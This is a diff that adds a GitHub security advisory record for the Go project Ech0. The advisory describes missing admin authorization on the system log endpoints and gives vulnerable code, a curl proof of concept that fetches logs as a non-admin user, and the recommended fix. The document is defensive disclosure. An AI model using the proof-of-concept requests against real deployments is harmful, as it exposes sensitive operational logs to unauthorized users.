@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-cp79-9mwr-wr49",
+  "modified": "2026-04-10T19:49:49.841554Z",
+  "published": "2026-04-10T19:40:02Z",
+  "summary": "Ech0: Missing authorization on dashboard log endpoints allows low-privilege users to access sensitive system logs",
+  "details": "## Summary\n\nEch0 allows any authenticated user to read historical system logs and subscribe to live log streams because the dashboard log endpoints validate only that a JWT is present and valid, but do not require an administrator role or privileged scope.\n\n## Impact\n\nAny valid user session can access `GET /api/system/logs` and can also connect to the SSE and WebSocket log streaming endpoints. This exposes operational log data to low-privilege users. Depending on deployment and logging practices, the returned logs may include internal file paths, stack traces, admin activity, background job output, internal URLs, and other sensitive operational context. This creates a post-authentication information disclosure primitive that can materially aid follow-on attacks.\n\n## Details\n\nThe issue is caused by an authorization gap between route registration, handler logic, and the service layer.\n\n`internal/router/dashboard.go` registers the log endpoints on authenticated router groups, but does not apply any admin-only authorization middleware:\n\n```go\nfunc setupDashboardRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {\n\t// Auth\n\tappRouterGroup.AuthRouterGroup.GET(\"/system/logs\", h.DashboardHandler.GetSystemLogs())\n\tappRouterGroup.AuthRouterGroup.GET(\"/system/logs/stream\", h.DashboardHandler.SSESubscribeSystemLogs())\n\tappRouterGroup.WSRouterGroup.GET(\"/system/logs\", h.DashboardHandler.WSSubscribeSystemLogs())\n}\n```\n\n`internal/handler/dashboard/dashboard.go` returns log data directly and the SSE/WS handlers only check whether `jwtUtil.ParseToken(token)` succeeds:\n\n```go\nfunc (dashboardHandler *DashboardHandler) GetSystemLogs() gin.HandlerFunc {\n\treturn res.Execute(func(ctx *gin.Context) res.Response {\n\t\tlogs, err := dashboardHandler.dashboardService.GetSystemLogs(service.SystemLogQuery{\n\t\t\tTail:    tail,\n\t\t\tLevel:   ctx.Query(\"level\"),\n\t\t\tKeyword: ctx.Query(\"keyword\"),\n\t\t})\n\t\tif err != nil {\n\t\t\treturn res.Response{Err: err}\n\t\t}\n\t\treturn res.Response{\n\t\t\tData: logs,\n\t\t\tMsg:  \"获取系统日志成功\",\n\t\t}\n\t})\n}\n```\n\n`internal/service/dashboard/dashboard.go` exposes the log backend without adding a compensating admin check:\n\n```go\nfunc (s *DashboardService) GetSystemLogs(query SystemLogQuery) ([]logUtil.LogEntry, error) {\n\ttail := query.Tail\n\tif tail \u003c= 0 {\n\t\ttail = 200\n\t}\n\treturn logUtil.QueryLogFileTail(logUtil.CurrentLogFilePath(), tail, query.Level, query.Keyword)\n}\n```\n\nAffected endpoints:\n\n- `GET /api/system/logs`\n- `GET /api/system/logs/stream?token=...`\n- `GET /ws/system/logs?token=...`\n\n\n## Proof of concept\n\n### 1. Start the app\n\n```bash\ndocker run -d \\\n  --name ech0 \\\n  -p 6277:6277 \\\n  -v /opt/ech0/data:/app/data \\\n  -e JWT_SECRET=\"Hello Echos\" \\\n  sn0wl1n/ech0:latest\n```\n\n### 2. Initialize an owner account and register a normal user\n\n```bash\ncurl -sS -X POST \"http://127.0.0.1:6277/api/init/owner\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"owner\",\"password\":\"ownerpass\",\"email\":\"owner@example.com\"}'\n\ncurl -sS -X POST \"http://127.0.0.1:6277/api/register\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"winky\",\"password\":\"winkypass\",\"email\":\"winky@example.com\"}'\n```\n\n### 3. Log in as the non-admin user and request the system log endpoint\n\n```bash\nwinky_token=$(\n  curl -sS -X POST \"http://127.0.0.1:6277/api/login\" \\\n    -H 'Content-Type: application/json' \\\n    -d '{\"username\":\"winky\",\"password\":\"winkypass\"}' \\\n  | sed -n 's/.*\"data\":\"\\([^\"]*\\)\".*/\\1/p'\n)\n\ncurl -sS \"http://127.0.0.1:6277/api/system/logs\" \\\n  -H \"Authorization: Bearer $winky_token\"\n```\n\nObserved response: the non-admin user receives 200 OK and a JSON response containing entries from `app.log`\n\n\u003cimg width=\"1073\" height=\"183\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f0a836fa-121f-4fb7-a94c-92344d9aedd8\" /\u003e\n\n\nThe same missing-authorization pattern also affects:\n\n- `GET /api/system/logs/stream?token=\u003cnon-admin-token\u003e`\n- `GET /ws/system/logs?token=\u003cnon-admin-token\u003e`\n\n\n## Recommended fix\n\nRequire an explicit admin-only scope on all dashboard log routes and enforce the same requirement in the service layer.\n\nSuggested change in `internal/router/dashboard.go`:\n\n```go\nimport (\n\t\"github.com/lin-snow/ech0/internal/handler\"\n\t\"github.com/lin-snow/ech0/internal/middleware\"\n\tauthModel \"github.com/lin-snow/ech0/internal/model/auth\"\n)\n\nfunc setupDashboardRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {\n\tappRouterGroup.AuthRouterGroup.GET(\n\t\t\"/system/logs\",\n\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n\t\th.DashboardHandler.GetSystemLogs(),\n\t)\n\tappRouterGroup.AuthRouterGroup.GET(\n\t\t\"/system/logs/stream\",\n\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n\t\th.DashboardHandler.SSESubscribeSystemLogs(),\n\t)\n\tappRouterGroup.WSRouterGroup.GET(\n\t\t\"/system/logs\",\n\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n\t\th.DashboardHandler.WSSubscribeSystemLogs(),\n\t)\n}\n```\n\nSuggested defense-in-depth change in the service layer:\n\n```go\nfunc (s *DashboardService) GetSystemLogs(ctx context.Context, query SystemLogQuery) ([]logUtil.LogEntry, error) {\n\tif err := s.ensureAdmin(ctx); err != nil {\n\t\treturn nil, err\n\t}\n\n\ttail := query.Tail\n\tif tail \u003c= 0 {\n\t\ttail = 200\n\t}\n\treturn logUtil.QueryLogFileTail(logUtil.CurrentLogFilePath(), tail, query.Level, query.Keyword)\n}\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/lin-snow/ech0",
+        "purl": "pkg:golang/github.com/lin-snow/ech0"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.3.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-cp79-9mwr-wr49/GHSA-cp79-9mwr-wr49.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/lin-snow/Ech0/security/advisories/GHSA-cp79-9mwr-wr49"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/lin-snow/Ech0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/lin-snow/Ech0/releases/tag/v4.3.5"
+    }
+  ]
+}
